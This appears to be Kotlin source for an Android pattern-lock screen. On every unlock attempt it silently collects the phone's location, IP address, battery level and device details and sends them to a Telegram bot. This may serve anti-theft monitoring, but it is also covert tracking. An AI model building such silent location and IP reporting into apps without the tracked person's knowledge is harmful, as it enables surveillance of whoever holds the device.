package com.example.keyguard

import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.andrognito.patternlockview.PatternLockView
import com.andrognito.patternlockview.listener.PatternLockViewListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class PatternLockActivity : AppCompatActivity() {

    private lateinit var patternLockView: PatternLockView
    private lateinit var telegramBotHandler: TelegramBotHandler
    private val correctPattern = listOf(0, 1, 2, 3) // Пример правильного шаблона

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_pattern_lock)

        patternLockView = findViewById(R.id.pattern_lock_view)
        telegramBotHandler = TelegramBotHandler(
            context = this,
            botToken = Constants.TELEGRAM_BOT_TOKEN,
            chatId = Constants.TELEGRAM_CHAT_IDS.first(),
            resetLockoutCallback = { resetLockout() }
        )

        patternLockView.addPatternLockListener(object : PatternLockViewListener {
            override fun onComplete(pattern: MutableList<PatternLockView.Dot>?) {
                val enteredPattern = pattern?.map { it.id } ?: emptyList()
                if (enteredPattern == correctPattern) {
                    Toast.makeText(this@PatternLockActivity, "Pattern correct", Toast.LENGTH_SHORT).show()
                    sendUnlockNotification(true)
                } else {
                    Toast.makeText(this@PatternLockActivity, "Pattern incorrect", Toast.LENGTH_SHORT).show()
                    sendUnlockNotification(false)
                }
            }

            // Остальные методы интерфейса можно оставить пустыми
            override fun onCleared() {}
            override fun onStarted() {}
            override fun onProgress(progressPattern: MutableList<PatternLockView.Dot>?) {}
        })
    }

    private fun resetLockout() {
        // Логика сброса блокировки
    }

    private fun sendUnlockNotification(success: Boolean) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val location = getLocation()
                val batteryLevel = DataCollector.getBatteryLevel(this@PatternLockActivity)
                val deviceInfo = DataCollector.getDeviceInfo(this@PatternLockActivity)
                val ipAddress = withContext(Dispatchers.IO) { DataCollector.getIpAddress() }
                val attemptType = if (success) "SUCCESS" else "FAILURE"
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

                val data = JSONObject().apply {
                    put("timestamp", timestamp)
                    put("attemptType", attemptType)
                    put("location", location)
                    put("batteryLevel", batteryLevel)
                    put("deviceInfo", deviceInfo)
                    put("ipAddress", ipAddress)
                }

                val formattedMessage = formatMessage(data)
                telegramBotHandler.sendTelegramMessage(formattedMessage)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private suspend fun getLocation(): String = suspendCancellableCoroutine { continuation ->
        DataCollector.getLocation(this) { location ->
            continuation.resume(location) { }
        }
    }

    private fun formatMessage(data: JSONObject): String {
        return """
        |*Unlock Attempt Log*
        |*Timestamp:* ${data.getString("timestamp")}
        |*Attempt Type:* ${data.getString("attemptType")}
        |*Location:* ${data.getString("location")}
        |*Battery Level:* ${data.getInt("batteryLevel")}% 
        |*Device Info:* ${data.getString("deviceInfo")}
        |*IP Address:* ${data.getString("ipAddress")}
        """.trimMargin()
    }
}
